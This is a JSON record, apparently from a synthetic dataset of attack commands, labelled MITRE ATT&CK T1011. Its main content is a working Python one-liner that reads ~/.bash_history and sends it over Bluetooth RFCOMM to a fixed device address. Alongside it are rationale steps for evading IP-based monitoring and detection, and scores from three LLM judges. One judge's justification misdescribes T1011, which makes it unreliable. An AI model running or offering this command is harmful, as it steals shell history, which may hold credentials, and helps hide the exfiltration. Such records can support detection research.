{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket,os; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('00:1A:7D:DA:71:13', 27)); p=os.path.expanduser('~/.bash_history'); s.sendall(open(p,'rb').read()); s.close()\"",
  "explanation": "Uses Bluetooth RFCOMM channel 27 to move shell history data outside the normal IP stack, consistent with T1011 exfiltration over other network mediums.",
  "rationale_steps": [
    "Choose Bluetooth (RFCOMM) to avoid IP-based monitoring.",
    "Connect to an uncommon RFCOMM channel (27) to reduce detection.",
    "Read and send ~/.bash_history over the RFCOMM socket.",
    "Terminate connection cleanly to leave minimal indicators."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-dde69e91",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The command is properly quoted and delimited, with valid Python syntax and correct use of socket constants and function calls.",
        "semantic_score": 5,
        "semantic_justification": "It attempts to exfiltrate ~/.bash_history over a Bluetooth RFCOMM connection to a specified MAC and channel, aligning with T1011 exfiltration over other network mediums assuming a reachable listener.",
        "combined_score": 5.0,
        "confidence": 0.9,
        "timestamp": "2025-10-01T21:42:24.366513Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for importing modules, creating a socket, setting timeout, connecting to a Bluetooth device, reading a file, and sending data.",
        "semantic_score": 4,
        "semantic_justification": "The command correctly implements exfiltration over Bluetooth (alternative network medium) as described in T1011, though it's using Python directly rather than abusing a trusted system script as the primary vector which slightly misaligns with the specific technique description.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T04:00:37.012970Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes and parentheses, valid Python syntax, and proper execution via `python3 -c`.",
        "semantic_score": 1,
        "semantic_justification": "The command performs direct execution of custom Python code for Bluetooth exfiltration, which does not align with T1011's core mechanism of 'System Script Proxy Execution' via existing, trusted system scripts.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T04:00:44.229800Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.333,
    "llm_average_score": 4.167,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}